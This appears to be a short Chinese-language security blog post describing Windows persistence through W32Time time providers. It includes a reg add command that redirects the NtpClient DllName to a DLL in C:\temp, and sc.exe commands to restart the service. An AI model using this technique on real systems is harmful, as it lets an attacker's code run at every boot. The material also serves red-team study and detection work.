---
title: Persistence Time Providers
date: 2023-09-14T16:39:21+08:00
draft: false
url: /posts/2023-09-14/Time-Providers
tags:
  - Windows
  - Persistence
  - Time-Providers
---

## 0x00 前言

Persistence Time Providers

## 0x01  Time Providers

时间提供程序以 DLL 文件的形式实现，该文件位于 System32 文件夹中；**W32Time**服务在 Windows 启动期间启动并加载 w32time.dll

需要管理员级别权限，因为指向时间提供程序 DLL 文件的注册表项存储在 HKEY_LOCAL_MACHINE 中

根据系统是用作 NTP 服务器还是 NTP 客户端，使用以下两个注册表位置

```powershell
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer
```

##  0x02 利用原理

注册表利用

```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v DllName /t REG_SZ /d "C:\temp\w32time.dll"
```

该服务将在 Windows 启动期间启动，或者通过执行以下命令手动启动

```cmd
sc.exe stop w32time
sc.exe start w32time
```
